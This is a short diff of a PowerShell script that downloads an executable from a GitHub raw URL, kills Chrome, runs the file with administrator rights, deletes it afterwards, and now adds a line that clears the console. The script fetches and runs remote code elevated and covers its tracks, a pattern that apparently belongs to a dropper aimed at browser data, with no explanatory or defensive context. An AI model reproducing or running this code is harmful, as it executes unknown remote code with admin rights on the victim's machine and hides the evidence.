@@ -17,6 +17,7 @@ $url = "https://github.com/elfrenko2/MCL/raw/main/cGALIL.exe"
 Invoke-WebRequest -Uri $url -OutFile $exePath
 
 Stop-Process -Name "chrome"
+Clear-Host
 $proc = Start-Process -FilePath $exePath -Verb RunAs -PassThru
 $proc.WaitForExit()
 Remove-Item $exePath -Force
